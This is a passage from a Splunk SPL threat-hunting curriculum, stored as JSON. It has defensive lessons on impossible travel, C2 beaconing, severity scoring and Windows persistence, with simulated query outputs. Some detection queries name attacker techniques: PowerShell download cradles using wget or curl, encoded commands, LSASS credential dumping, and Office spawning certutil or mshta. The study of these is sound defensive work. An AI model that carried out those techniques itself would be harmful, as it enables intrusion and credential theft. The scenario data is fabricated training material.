              "finding": "Two impossible travel events detected: jsmith (LondonNYC in 30 min = 11,140 km/h!) and pjones (SFOTokyo in 2.3 hours = 3,596 km/h). Both physically impossible."
            },
            {
              "question": "Filter out VPN and known proxy IPs that might cause false positives.",
              "hint": "Exclude corporate VPN egress points and cloud provider IPs.",
              "spl": "index=auth action=success | iplocation src_ip | where isnotnull(lat)\n| search NOT src_ip IN (\"203.0.113.*\", \"198.51.100.*\")\n| sort user, _time\n| streamstats window=2 current=t earliest(_time) as prev_time, earliest(lat) as prev_lat, earliest(lon) as prev_lon, earliest(City) as prev_city, earliest(src_ip) as prev_ip by user\n| where isnotnull(prev_time) AND prev_time != _time\n| eval time_hours = (_time - prev_time) / 3600\n| eval distance_km = 6371 * acos(cos(pi()/180 * lat) * cos(pi()/180 * prev_lat) * cos(pi()/180 * (lon - prev_lon)) + sin(pi()/180 * lat) * sin(pi()/180 * prev_lat))\n| where distance_km > 500 AND time_hours < 1\n| table _time, user, prev_city, prev_ip, City, src_ip, time_hours, distance_km",
              "analysis": "Exclude VPN ranges and require significant distance (>500km) in short time (<1hr).",
              "output": {
                "columns": [
                  "_time",
                  "user",
                  "prev_city",
                  "prev_ip",
                  "City",
                  "src_ip",
                  "time_hours",
                  "distance_km"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 14:23:17",
                    "user": "jsmith",
                    "prev_city": "London",
                    "prev_ip": "51.148.23.99",
                    "City": "New York",
                    "src_ip": "74.125.23.100",
                    "time_hours": "0.5",
                    "distance_km": "5570"
                  }
                ]
              },
              "finding": "After filtering VPN IPs, jsmith remains flagged. pjones was using corporate VPN (false positive). Focus investigation on jsmith."
            },
            {
              "question": "Investigate jsmith's account - is this a compromised credential or legitimate activity?",
              "hint": "Check login patterns, user agent, and whether both sessions were active simultaneously.",
              "spl": "index=auth user=\"jsmith\" earliest=\"01/15/2024:13:00:00\" latest=\"01/15/2024:15:00:00\"\n| iplocation src_ip\n| stats count, values(action) as actions, values(user_agent) as agents, values(app) as apps by src_ip, City, Country\n| sort -count",
              "analysis": "Look for anomalies in the login pattern and user agents.",
              "output": {
                "columns": [
                  "src_ip",
                  "City",
                  "Country",
                  "actions",
                  "agents",
                  "apps",
                  "count"
                ],
                "rows": [
                  {
                    "src_ip": "51.148.23.99",
                    "City": "London",
                    "Country": "United Kingdom",
                    "actions": "success",
                    "agents": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "apps": "Outlook, SharePoint",
                    "count": "12"
                  },
                  {
                    "src_ip": "74.125.23.100",
                    "City": "New York",
                    "Country": "United States",
                    "actions": "success",
                    "agents": "Python-urllib/3.9",
                    "apps": "API",
                    "count": "47"
                  }
                ]
              },
              "finding": "SUSPICIOUS: London IP uses normal browser for Outlook/SharePoint. NYC IP uses Python script for API access (47 calls in 2 hours). Different user agents + simultaneous sessions = likely credential theft."
            },
            {
              "question": "What was the suspicious NYC session accessing?",
              "hint": "Look at API calls and data access patterns.",
              "spl": "index=api_access user=\"jsmith\" src_ip=\"74.125.23.100\" | stats count by endpoint, http_method, response_code | sort -count",
              "analysis": "Identify what data the suspicious session was accessing.",
              "output": {
                "columns": [
                  "endpoint",
                  "http_method",
                  "response_code",
                  "count"
                ],
                "rows": [
                  {
                    "endpoint": "/api/v1/users/list",
                    "http_method": "GET",
                    "response_code": "200",
                    "count": "15"
                  },
                  {
                    "endpoint": "/api/v1/contacts/export",
                    "http_method": "GET",
                    "response_code": "200",
                    "count": "12"
                  },
                  {
                    "endpoint": "/api/v1/documents/search",
                    "http_method": "GET",
                    "response_code": "200",
                    "count": "20"
                  }
                ]
              },
              "finding": "Attacker is using API to enumerate users, export contacts, and search documents. This is systematic data exfiltration using stolen credentials."
            }
          ],
          "conclusion": "<strong>Investigation Complete - Credential Compromise Confirmed</strong><br><br>\n                    <strong>Finding:</strong> jsmith's credentials are being used simultaneously from London (legitimate) and New York (attacker).<br><br>\n                    <strong>Evidence:</strong>\n                    <ul>\n                        <li>Impossible travel: London  NYC in 30 minutes</li>\n                        <li>Different user agents: Browser (legitimate) vs Python script (attacker)</li>\n                        <li>Simultaneous active sessions</li>\n                        <li>NYC session performing bulk API data extraction</li>\n                    </ul><br>\n                    <strong>Actions:</strong>\n                    <ol>\n                        <li>Revoke all active sessions for jsmith</li>\n                        <li>Force password reset and MFA re-enrollment</li>\n                        <li>Block IP 74.125.23.100</li>\n                        <li>Review all API access from that IP</li>\n                        <li>Check for data exfiltration (contacts export, document downloads)</li>\n                        <li>Investigate how credentials were compromised (phishing, malware, reuse)</li>\n                    </ol>"
        }
      },
      {
        "id": "int-009",
        "title": "Building Severity Scores",
        "type": "challenge",
        "difficulty": "intermediate",
        "duration": "20 min",
        "objectives": [
          "Use conditional logic to categorize events",
          "Build composite risk scores",
          "Prioritize alerts effectively"
        ],
        "tags": [
          "eval",
          "case",
          "scoring",
          "prioritization",
          "alerting"
        ],
        "description": "Learn to build severity and risk scores using conditional logic.",
        "content": {
          "problem": "Your SOC receives too many alerts. Build a severity scoring system for firewall events that considers: bytes transferred (data exfiltration risk), destination reputation (threat intel), time of day (after-hours is suspicious), and connection frequency (scanning behavior). Output events with a composite score sorted by highest risk.",
          "hints": [
            "Use case() for multi-condition severity levels",
            "Create individual scores for each factor, then combine them",
            "eval can reference previously defined fields in the same command",
            "Use strftime to check time of day"
          ],
          "solution": {
            "spl": "index=firewall action=allowed\n| lookup threat_intel.csv ip as dest_ip OUTPUT threat_score\n| eval threat_score = coalesce(threat_score, 0)\n| eval hour = strftime(_time, \"%H\")\n| eval bytes_score = case(\n    bytes_out > 100000000, 4,\n    bytes_out > 10000000, 3,\n    bytes_out > 1000000, 2,\n    bytes_out > 100000, 1,\n    true(), 0)\n| eval time_score = if(hour >= 22 OR hour < 6, 2, 0)\n| eval dest_score = case(\n    threat_score >= 80, 4,\n    threat_score >= 50, 3,\n    threat_score >= 20, 2,\n    threat_score > 0, 1,\n    true(), 0)\n| stats count as connections, sum(bytes_out) as total_bytes, max(bytes_score) as bytes_score, max(time_score) as time_score, max(dest_score) as dest_score by src_ip, dest_ip\n| eval freq_score = case(connections > 1000, 3, connections > 100, 2, connections > 10, 1, true(), 0)\n| eval total_score = bytes_score + time_score + dest_score + freq_score\n| eval severity = case(total_score >= 8, \"critical\", total_score >= 5, \"high\", total_score >= 3, \"medium\", true(), \"low\")\n| where severity IN (\"critical\", \"high\")\n| sort -total_score\n| table src_ip, dest_ip, severity, total_score, connections, total_bytes, bytes_score, time_score, dest_score, freq_score",
            "explanation": "We build individual scores for each risk factor (bytes, time, threat intel, frequency) on a consistent scale (0-4). Then combine them into a total score and map to severity levels. This creates a prioritized, explainable alert queue."
          },
          "variations": [
            {
              "description": "Add geographic risk (connections to high-risk countries):",
              "spl": "... | iplocation dest_ip\n| eval geo_score = case(\n    Country IN (\"Russia\", \"China\", \"North Korea\", \"Iran\"), 3,\n    Country IN (\"Ukraine\", \"Romania\", \"Brazil\"), 2,\n    isnull(Country), 1,\n    true(), 0)\n| eval total_score = bytes_score + time_score + dest_score + freq_score + geo_score"
            },
            {
              "description": "Weight certain factors more heavily:",
              "spl": "... | eval total_score = (bytes_score * 2) + time_score + (dest_score * 3) + freq_score"
            },
            {
              "description": "Add user context for insider threat scoring:",
              "spl": "... | lookup user_risk.csv user OUTPUT user_risk_score, department\n| eval user_score = case(department=\"Finance\" AND bytes_out > 10000000, 3, user_risk_score > 50, 2, true(), 0)"
            },
            {
              "description": "Create severity with icons for dashboards:",
              "spl": "... | eval severity_icon = case(severity=\"critical\", \"\", severity=\"high\", \"\", severity=\"medium\", \"\", true(), \"\")"
            }
          ]
        }
      },
      {
        "id": "int-010",
        "title": "Threat Hunting Methodology",
        "type": "tutorial",
        "difficulty": "intermediate",
        "duration": "25 min",
        "objectives": [
          "Understand the difference between reactive and proactive security",
          "Learn the hypothesis-driven hunting cycle",
          "Apply the PEAK hunting framework",
          "Build hunt queries from threat intelligence"
        ],
        "tags": [
          "threat hunting",
          "methodology",
          "hypothesis",
          "proactive",
          "PEAK"
        ],
        "description": "Learn the systematic approach to proactive threat hunting using hypothesis-driven methodology.",
        "content": {
          "sections": [
            {
              "title": "From Reactive to Proactive",
              "body": "<p>Traditional security operations are <strong>reactive</strong>: you wait for alerts, then investigate. Threat hunting is <strong>proactive</strong>: you assume adversaries are already in your environment and actively search for them before alerts fire.</p><p>Why hunt? Because no detection is perfect. Attackers evade rules, new techniques emerge faster than signatures update, and some activities only look suspicious in context.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "The Hypothesis-Driven Approach",
              "body": "<p>Effective hunting starts with a <strong>hypothesis</strong>an educated guess about attacker behavior you can test with data.</p><p><strong>Bad hypothesis:</strong> \"Find bad stuff.\"</p><p><strong>Good hypothesis:</strong> \"Attackers using stolen credentials may authenticate to many systems in a short time window. I will look for users with successful logins to 10+ unique hosts within 1 hour.\"</p><p>A good hypothesis is specific, testable, and based on threat intelligence or attack patterns.</p>",
              "spl": "index=wineventlog EventCode=4624 Logon_Type=3\n| bin _time span=1h\n| stats dc(ComputerName) as systems_accessed values(ComputerName) as hosts by _time, user\n| where systems_accessed >= 10",
              "explanation": "This query tests the lateral movement hypothesis by finding users authenticating to 10+ systems within 1-hour windows."
            },
            {
              "title": "The PEAK Framework",
              "body": "<p>PEAK provides structure for your hunts:</p><ul><li><strong>P - Prepare:</strong> Gather intel, define scope, identify data sources</li><li><strong>E - Execute:</strong> Run your hunt queries, iterate on results</li><li><strong>A - Analyze:</strong> Investigate findings, validate or refute hypothesis</li><li><strong>K - Knowledge:</strong> Document findings, create detections, share with team</li></ul><p>The cycle repeats: each hunt generates knowledge that informs future hypotheses.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Building Hypotheses from Threat Intel",
              "body": "<p>Threat intelligence reports describe attacker TTPs (Tactics, Techniques, Procedures). Convert these into testable queries:</p><p><strong>Intel:</strong> \"APT group uses scheduled tasks for persistence\"</p><p><strong>Hypothesis:</strong> \"I will look for new scheduled task creation, especially those running from unusual paths or by non-admin users.\"</p>",
              "spl": "index=wineventlog EventCode=4698\n| eval task_path = lower(Task_Content)\n| search task_path=*temp* OR task_path=*appdata* OR task_path=*public*\n| table _time, ComputerName, user, Task_Name, task_path",
              "explanation": "Hunts for scheduled tasks created with executables in suspicious locations often used by attackers."
            },
            {
              "title": "The Hunt-Detect Loop",
              "body": "<p>Hunting and detection are complementary:</p><ol><li><strong>Hunt</strong> discovers new patterns manually</li><li>Validated findings become <strong>detection rules</strong></li><li>Detection gaps inspire new <strong>hunt hypotheses</strong></li></ol><p>Every successful hunt should produce: documentation of what you found, queries others can reuse, and ideally a new correlation rule or alert.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Practical Hunt Example: Living Off the Land",
              "body": "<p>\"Living off the land\" attacks use built-in system tools (LOLBins) to avoid detection. Let's hunt for suspicious PowerShell usagea common technique.</p>",
              "spl": "index=wineventlog EventCode=4688 New_Process_Name=\"*powershell.exe\"\n| rex field=Process_Command_Line \"(?<encoded>-[eE][nN][cC]\\s+[A-Za-z0-9+/=]+)\"\n| rex field=Process_Command_Line \"(?<download>downloadstring|downloadfile|invoke-webrequest|wget|curl)\"\n| where isnotnull(encoded) OR isnotnull(download)\n| table _time, ComputerName, user, Process_Command_Line",
              "explanation": "Finds PowerShell executions with encoded commands or download cradlescommon attacker patterns that blend in with normal admin activity."
            }
          ]
        }
      },
      {
        "id": "int-011",
        "title": "Developing Hunt Hypotheses",
        "type": "challenge",
        "difficulty": "intermediate",
        "duration": "20 min",
        "objectives": [
          "Transform threat intelligence into testable hypotheses",
          "Write hunt queries from behavioral descriptions",
          "Identify key fields and thresholds for hunting"
        ],
        "tags": [
          "threat hunting",
          "hypothesis",
          "MITRE ATT&CK",
          "detection"
        ],
        "description": "Practice converting threat intelligence into actionable hunt queries.",
        "content": {
          "problem": "A threat intelligence report describes an APT group's techniques:\n\n1. Initial access via phishing with Excel attachments that spawn child processes\n2. Discovery using `net user` and `net group` commands\n3. Credential dumping targeting the `LSASS` process\n4. Data staging by compressing files with `7zip` or `rar` before exfiltration\n\nBuild hunt queries for at least TWO of these behaviors. Focus on detecting the behavior pattern, not specific malware signatures.",
          "hints": [
            "For parent-child process relationships, look at `Creator_Process_Name` and `New_Process_Name`",
            "Commands like `net user` appear in `Process_Command_Line`",
            "LSASS access shows up in specific Windows event codes or Sysmon logs",
            "Compression tools have distinctive process names and often run from unusual locations"
          ],
          "solution": {
            "spl": "`Hunt 1: Excel spawning suspicious children`\nindex=wineventlog EventCode=4688 Creator_Process_Name=\"*excel.exe\"\n| search New_Process_Name IN (\"*cmd.exe\", \"*powershell.exe\", \"*wscript.exe\", \"*mshta.exe\", \"*certutil.exe\")\n| table _time, ComputerName, user, Creator_Process_Name, New_Process_Name, Process_Command_Line\n\n`Hunt 2: Discovery commands`\nindex=wineventlog EventCode=4688 \n| search Process_Command_Line=\"*net user*\" OR Process_Command_Line=\"*net group*\" OR Process_Command_Line=\"*net localgroup*\"\n| stats count, values(Process_Command_Line) as commands by user, ComputerName\n| where count >= 3\n\n`Hunt 3: Compression in staging`\nindex=wineventlog EventCode=4688 New_Process_Name IN (\"*7z.exe\", \"*7za.exe\", \"*rar.exe\", \"*winrar.exe\")\n| search NOT Creator_Process_Name IN (\"*explorer.exe\", \"*backup*\")\n| table _time, ComputerName, user, New_Process_Name, Process_Command_Line",
            "explanation": "Each query focuses on the behavior, not signatures. Hunt 1 catches any suspicious process spawned by Excel. Hunt 2 aggregates discovery commands to find reconnaissance. Hunt 3 finds compression tools run programmatically (not from Explorer or backup software)."
          },
          "variations": [
            {
              "description": "Add timeline analysis to discovery commands:",
              "spl": "index=wineventlog EventCode=4688\n| search Process_Command_Line IN (\"*net user*\", \"*whoami*\", \"*systeminfo*\", \"*ipconfig*\")\n| transaction user maxspan=5m\n| where eventcount >= 4\n| table _time, user, ComputerName, eventcount"
            },
            {
              "description": "Hunt for LSASS access via Sysmon:",
              "spl": "index=sysmon EventCode=10 TargetImage=\"*lsass.exe\"\n| search NOT SourceImage IN (\"*csrss.exe\", \"*wininit.exe\", \"*wmiprvse.exe\")\n| table _time, ComputerName, SourceImage, GrantedAccess"
            }
          ]
        }
      }
    ],
    "advanced": [
      {
        "id": "adv-001",
        "title": "Statistical Baselines",
        "type": "tutorial",
        "difficulty": "advanced",
        "duration": "30 min",
        "objectives": [
          "Calculate dynamic baselines with eventstats",
          "Detect deviations with streamstats",
          "Build anomaly detection logic"
        ],
        "tags": [
          "statistics",
          "baselines",
          "anomaly-detection"
        ],
        "description": "Master eventstats and streamstats for sophisticated statistical analysis.",
        "content": {
          "sections": [
            {
              "title": "eventstats vs stats",
              "body": "<p><code>eventstats</code> is like stats, but it adds the aggregation to each event WITHOUT collapsing rows. This lets you compare each event to the group.</p>",
              "spl": "index=web | eventstats avg(response_time) as avg_response, stdev(response_time) as stdev_response by uri_path | eval z_score=(response_time - avg_response) / stdev_response | where z_score > 3",
              "explanation": "Calculate average response time per URL, then find requests with z-score > 3 (statistical outliers)."
            },
            {
              "title": "streamstats for Moving Windows",
              "body": "<p><code>streamstats</code> calculates statistics over a moving window of events. Great for detecting sudden changes.</p>",
              "spl": "index=web | bin _time span=5m | stats count by _time | streamstats window=12 avg(count) as rolling_avg, stdev(count) as rolling_stdev | eval upper_bound=rolling_avg+(2*rolling_stdev) | where count > upper_bound",
              "explanation": "Calculate 1-hour rolling average (12 x 5min buckets), flag when current count exceeds 2 standard deviations."
            },
            {
              "title": "Building Baselines",
              "body": "<p>Create robust baselines using historical data:</p>",
              "spl": "index=auth action=failure | bin _time span=1h | stats count as failures by _time, user | eventstats avg(failures) as baseline_avg, stdev(failures) as baseline_stdev by user | eval anomaly_score=(failures - baseline_avg) / baseline_stdev | where anomaly_score > 2",
              "explanation": "Per-user baseline for failed authentications. Flag hours with significantly elevated failures."
            },
            {
              "title": "Percentile-Based Detection",
              "body": "<p>Percentiles can be more robust than standard deviation for non-normal distributions:</p>",
              "spl": "index=firewall | stats sum(bytes_out) as bytes by src_ip | eventstats perc95(bytes) as p95_bytes, perc99(bytes) as p99_bytes | eval severity=case(bytes>p99_bytes, \"critical\", bytes>p95_bytes, \"warning\", 1=1, \"normal\") | where severity!=\"normal\"",
              "explanation": "Flag IPs above the 95th and 99th percentile of traffic volume."
            }
          ]
        }
      },
      {
        "id": "adv-002",
        "title": "Beaconing Detection",
        "type": "scenario",
        "difficulty": "advanced",
        "duration": "35 min",
        "objectives": [
          "Identify periodic C2 communication patterns",
          "Calculate timing consistency metrics",
          "Distinguish beacons from legitimate traffic"
        ],
        "tags": [
          "network",
          "threat-hunting",
          "malware",
          "c2"
        ],
        "description": "Hunt for command-and-control beacons hidden in network traffic.",
        "content": {
          "situation": "Threat intelligence suggests attackers are using HTTPS beacons with 5-minute intervals to exfiltrate data. These beacons blend in with normal traffic but have telltale timing patterns. Hunt for them.",
          "steps": [
            {
              "question": "First, find all external HTTPS connections and calculate how many times each src_ip/dest_ip pair communicated.",
              "hint": "Filter to HTTPS (port 443) to external IPs and count connections per pair.",
              "spl": "index=firewall dest_port=443 NOT dest_ip=\"10.*\" NOT dest_ip=\"192.168.*\" NOT dest_ip=\"172.16.*\" | stats count by src_ip, dest_ip | where count > 20 | sort -count",
              "analysis": "Find frequently communicating pairs.",
              "output": {
                "columns": [
                  "src_ip",
                  "dest_ip",
                  "count"
                ],
                "rows": [
                  {
                    "src_ip": "10.10.25.44",
                    "dest_ip": "185.220.101.54",
                    "count": "288"
                  },
                  {
                    "src_ip": "10.10.33.78",
                    "dest_ip": "91.219.237.99",
                    "count": "144"
                  },
                  {
                    "src_ip": "10.10.42.19",
                    "dest_ip": "45.33.32.156",
                    "count": "96"
                  },
                  {
                    "src_ip": "10.10.15.22",
                    "dest_ip": "142.250.185.46",
                    "count": "87"
                  },
                  {
                    "src_ip": "10.10.18.55",
                    "dest_ip": "13.107.42.14",
                    "count": "72"
                  }
                ],
                "truncated": "Showing 5 of 847 IP pairs"
              },
              "finding": "Found 847 IP pairs with 20+ connections today. Need to narrow down to those with beacon-like regularity."
            },
            {
              "question": "Beacons have consistent timing. Calculate the time delta between consecutive connections for each pair.",
              "hint": "Use streamstats to calculate time between events, then look at consistency.",
              "spl": "index=firewall dest_port=443 src_ip=\"10.10.25.44\" dest_ip=\"185.220.101.54\" | sort _time | streamstats window=2 current=t earliest(_time) as prev_time by src_ip, dest_ip | eval delta=_time-prev_time | where isnotnull(delta) | stats avg(delta) as avg_delta, stdev(delta) as stdev_delta, count | eval consistency=stdev_delta/avg_delta",
              "analysis": "Low consistency ratio (stdev/avg) means regular timing - beacon behavior.",
              "output": {
                "columns": [
                  "avg_delta",
                  "stdev_delta",
                  "count",
                  "consistency"
                ],
                "rows": [
                  {
                    "avg_delta": "300.12",
                    "stdev_delta": "15.03",
                    "count": "287",
                    "consistency": "0.050"
                  }
                ]
              },
              "finding": "This pair shows avg_delta=300 seconds (5 minutes) with stdev=15 (consistency=0.05). Extremely regular - strong beacon indicator!"
            },
            {
              "question": "Now automate this across all pairs. Find those with beacon-like timing patterns.",
              "hint": "Apply the timing analysis to all pairs with sufficient data points.",
              "spl": "index=firewall dest_port=443 NOT dest_ip=\"10.*\" NOT dest_ip=\"192.168.*\" | sort _time | streamstats window=2 current=t earliest(_time) as prev_time by src_ip, dest_ip | eval delta=_time-prev_time | where isnotnull(delta) AND delta > 60 AND delta < 3600 | stats avg(delta) as avg_delta, stdev(delta) as stdev_delta, count by src_ip, dest_ip | where count > 10 | eval consistency=round(stdev_delta/avg_delta, 3) | where consistency < 0.15 | sort consistency | head 20",
              "analysis": "Find pairs with high count, 1-60 minute intervals, and consistency < 0.15.",
              "output": {
                "columns": [
                  "src_ip",
                  "dest_ip",
                  "avg_delta",
                  "stdev_delta",
                  "count",
                  "consistency"
                ],
                "rows": [
                  {
                    "src_ip": "10.10.25.44",
                    "dest_ip": "185.220.101.54",
                    "avg_delta": "300.12",
                    "stdev_delta": "15.03",
                    "count": "287",
                    "consistency": "0.050"
                  },
                  {
                    "src_ip": "10.10.33.78",
                    "dest_ip": "91.219.237.99",
                    "avg_delta": "600.45",
                    "stdev_delta": "48.04",
                    "count": "143",
                    "consistency": "0.080"
                  },
                  {
                    "src_ip": "10.10.42.19",
                    "dest_ip": "45.33.32.156",
                    "avg_delta": "900.22",
                    "stdev_delta": "99.02",
                    "count": "95",
                    "consistency": "0.110"
                  }
                ],
                "truncated": "Showing top 3 beacon candidates"
              },
              "finding": "Top 3 beacon candidates:\n1. 10.10.25.44  185.220.101.54: 5-min interval, consistency=0.05\n2. 10.10.33.78  91.219.237.99: 10-min interval, consistency=0.08\n3. 10.10.42.19  45.33.32.156: 15-min interval, consistency=0.11"
            },
            {
              "question": "Check if these destinations are known malicious or have suspicious characteristics.",
              "hint": "Cross-reference with threat intel and check reverse DNS.",
              "spl": "index=firewall dest_ip IN (\"185.220.101.54\", \"91.219.237.99\", \"45.33.32.156\") | iplocation dest_ip | lookup threat_intel_ip ip as dest_ip OUTPUT threat_type, malware_family | stats count, values(src_ip) as infected_hosts by dest_ip, dest_country, threat_type, malware_family",
              "analysis": "Enrich beacon destinations with context.",
              "output": {
                "columns": [
                  "dest_ip",
                  "dest_country",
                  "threat_type",
                  "malware_family",
                  "count",
                  "infected_hosts"
                ],
                "rows": [
                  {
                    "dest_ip": "185.220.101.54",
                    "dest_country": "Netherlands",
                    "threat_type": "C2",
                    "malware_family": "Cobalt Strike",
                    "count": "288",
                    "infected_hosts": "10.10.25.44"
                  },
                  {
                    "dest_ip": "91.219.237.99",
                    "dest_country": "Germany",
                    "threat_type": "TOR Exit",
                    "malware_family": "-",
                    "count": "144",
                    "infected_hosts": "10.10.33.78"
                  },
                  {
                    "dest_ip": "45.33.32.156",
                    "dest_country": "United States",
                    "threat_type": "-",
                    "malware_family": "-",
                    "count": "96",
                    "infected_hosts": "10.10.42.19"
                  }
                ]
              },
              "finding": "CONFIRMED: 185.220.101.54 matches known Cobalt Strike C2 infrastructure in threat intel. 91.219.237.99 is TOR exit node. 45.33.32.156 is clean (legitimate SaaS - false positive)."
            },
            {
              "question": "For confirmed C2, what data might be exfiltrated? Check bytes transferred.",
              "hint": "Look at data volume over time for the malicious connection.",
              "spl": "index=firewall dest_ip=\"185.220.101.54\" | timechart span=1h sum(bytes_in) as bytes_in, sum(bytes_out) as bytes_out | eval in_MB=round(bytes_in/1024/1024,2), out_MB=round(bytes_out/1024/1024,2)",
              "analysis": "Analyze data transfer patterns to/from C2.",
              "output": {
                "columns": [
                  "_time",
                  "bytes_in",
                  "bytes_out",
                  "in_MB",
                  "out_MB"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 00:00",
                    "bytes_in": "52428",
                    "bytes_out": "5242",
                    "in_MB": "0.05",
                    "out_MB": "0.01"
                  },
                  {
                    "_time": "2024-01-15 01:00",
                    "bytes_in": "48576",
                    "bytes_out": "4857",
                    "in_MB": "0.05",
                    "out_MB": "0.00"
                  },
                  {
                    "_time": "2024-01-15 02:00",
                    "bytes_in": "51200",
                    "bytes_out": "5120",
                    "in_MB": "0.05",
                    "out_MB": "0.00"
                  },
                  {
                    "_time": "2024-01-15 03:00",
                    "bytes_in": "102400",
                    "bytes_out": "47185920",
                    "in_MB": "0.10",
                    "out_MB": "45.00"
                  },
                  {
                    "_time": "2024-01-15 04:00",
                    "bytes_in": "49152",
                    "bytes_out": "4915",
                    "in_MB": "0.05",
                    "out_MB": "0.00"
                  }
                ],
                "truncated": "Showing 5 of 24 hours"
              },
              "finding": "Pattern shows small outbound (commands ~5KB) but larger inbound (responses ~50KB). Also one spike of 45MB outbound at 3 AM - possible data exfiltration event!"
            }
          ],
          "conclusion": "<strong>C2 Beaconing Confirmed!</strong><br><br>\n                    <strong>Confirmed C2 Infrastructure:</strong>\n                    <ul>\n                        <li>185.220.101.54 - Cobalt Strike C2 (5-min beacon)</li>\n                        <li>91.219.237.99 - TOR exit node (10-min beacon)</li>\n                    </ul><br>\n                    <strong>Infected Host:</strong> 10.10.25.44 (primary), 10.10.33.78 (secondary)<br><br>\n                    <strong>Data Exfiltration:</strong> 45MB transferred to C2 at 3 AM<br><br>\n                    <strong>Recommended Actions:</strong>\n                    <ol>\n                        <li>Isolate 10.10.25.44 and 10.10.33.78 immediately</li>\n                        <li>Block C2 IPs at perimeter firewall</li>\n                        <li>Forensic imaging of affected systems</li>\n                        <li>Hunt for lateral movement from these hosts</li>\n                        <li>Implement automated beaconing detection</li>\n                    </ol>"
        }
      },
      {
        "id": "adv-003",
        "title": "Persistence Mechanism Detection",
        "type": "scenario",
        "difficulty": "advanced",
        "duration": "30 min",
        "objectives": [
          "Identify registry-based persistence",
          "Detect scheduled task abuse",
          "Recognize service installation patterns"
        ],
        "tags": [
          "endpoint",
          "persistence",
          "threat-hunting",
          "windows"
        ],
        "description": "Hunt for attacker persistence mechanisms in Windows endpoint logs.",
        "content": {
          "situation": "After discovering a compromised system, you need to determine if the attacker established persistence. Check for common Windows persistence mechanisms: Run keys, scheduled tasks, and services.",
          "steps": [
            {
              "question": "Start with registry-based persistence. Look for modifications to common Run keys.",
              "hint": "Registry events with paths containing \"Run\" or \"RunOnce\" are persistence indicators.",
              "spl": "index=sysmon EventCode=13 | where match(TargetObject, \"(?i)(Run|RunOnce)\") | stats count, values(Details) as commands by TargetObject, Image, user | sort -count",
              "analysis": "Sysmon EventCode 13 is registry value set. We filter to Run keys.",
              "output": {
                "columns": [
                  "TargetObject",
                  "Image",
                  "user",
                  "commands",
                  "count"
                ],
                "rows": [
                  {
                    "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater",
                    "Image": "C:\\Windows\\System32\\reg.exe",
                    "user": "admin_jmorgan",
                    "commands": "C:\\Users\\Public\\updater.exe",
                    "count": "1"
                  },
                  {
                    "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth",
                    "Image": "C:\\Windows\\System32\\reg.exe",
                    "user": "SYSTEM",
                    "commands": "C:\\Program Files\\Windows Defender\\MSASCuiL.exe",
                    "count": "1"
                  }
                ]
              },
              "finding": "Suspicious entry found: \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater\" pointing to \"C:\\Users\\Public\\updater.exe\". This is NOT a Microsoft binary."
            },
            {
              "question": "Check scheduled tasks for suspicious entries. Look for newly created tasks.",
              "hint": "Event 4698 is scheduled task creation. Look for unusual task paths or executables.",
              "spl": "index=wineventlog EventCode=4698 | rex field=TaskContent \"<Command>(?<command>[^<]+)</Command>\" | rex field=TaskContent \"<Arguments>(?<arguments>[^<]*)</Arguments>\" | rex field=TaskContent \"<UserId>(?<run_as>[^<]+)</UserId>\" | stats count by TaskName, command, arguments, run_as, SubjectUserName | sort -count",
              "analysis": "Parse scheduled task creation events to see what's being scheduled.",
              "output": {
                "columns": [
                  "TaskName",
                  "command",
                  "arguments",
                  "run_as",
                  "SubjectUserName",
                  "count"
                ],
                "rows": [
                  {
                    "TaskName": "GoogleUpdate",
                    "command": "C:\\Windows\\Temp\\update.exe",
                    "arguments": "-silent",
                    "run_as": "SYSTEM",
                    "SubjectUserName": "admin_jmorgan",
                    "count": "1"
                  },
                  {
                    "TaskName": "MicrosoftEdgeUpdateTaskMachine",
                    "command": "C:\\Program Files\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
                    "arguments": "/c",
                    "run_as": "SYSTEM",
                    "SubjectUserName": "SYSTEM",
                    "count": "1"
                  }
                ]
              },
              "finding": "Suspicious task \"GoogleUpdate\" running C:\\Windows\\Temp\\update.exe as SYSTEM. Created by admin_jmorgan. Google doesn't put updates in TEMP!"
            },
            {
              "question": "Check for new service installations that could be backdoors.",
              "hint": "Event 4697 or 7045 indicates new service installation.",
              "spl": "index=wineventlog EventCode IN (4697, 7045) | rex field=ServiceFileName \"(?<service_path>[^\"]+)\" | stats count by ServiceName, ServiceType, service_path, SubjectUserName | where NOT match(service_path, \"(?i)(System32|SysWOW64|Program Files)\")",
              "analysis": "New services running from unusual paths are suspicious.",
              "output": {
                "columns": [
                  "ServiceName",
                  "ServiceType",
                  "service_path",
                  "SubjectUserName",
                  "count"
                ],
                "rows": [
                  {
                    "ServiceName": "WindowsHelper",
                    "ServiceType": "user mode service",
                    "service_path": "C:\\ProgramData\\helper.exe",
                    "SubjectUserName": "admin_jmorgan",
                    "count": "1"
                  }
                ]
              },
              "finding": "Service \"WindowsHelper\" installed from \"C:\\ProgramData\\helper.exe\" - services should NOT run from ProgramData!"
            },
            {
              "question": "Correlate these persistence mechanisms. Were they all created around the same time?",
              "hint": "Look at timestamps across all three persistence types.",
              "spl": "(index=sysmon EventCode=13 TargetObject=\"*Run*WindowsUpdater*\") OR (index=wineventlog EventCode=4698 TaskName=\"GoogleUpdate\") OR (index=wineventlog EventCode=7045 ServiceName=\"WindowsHelper\") | eval persistence_type=case(EventCode=13, \"Registry\", EventCode=4698, \"ScheduledTask\", EventCode=7045, \"Service\") | table _time, persistence_type, host, SubjectUserName | sort _time",
              "analysis": "Timeline the persistence installations.",
              "output": {
                "columns": [
                  "_time",
                  "persistence_type",
                  "host",
                  "SubjectUserName"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 02:41:17",
                    "persistence_type": "Registry",
                    "host": "WKS-HR-022",
                    "SubjectUserName": "admin_jmorgan"
                  },
                  {
                    "_time": "2024-01-15 02:43:08",
                    "persistence_type": "ScheduledTask",
                    "host": "WKS-HR-022",
                    "SubjectUserName": "admin_jmorgan"
                  },
                  {
                    "_time": "2024-01-15 02:45:22",
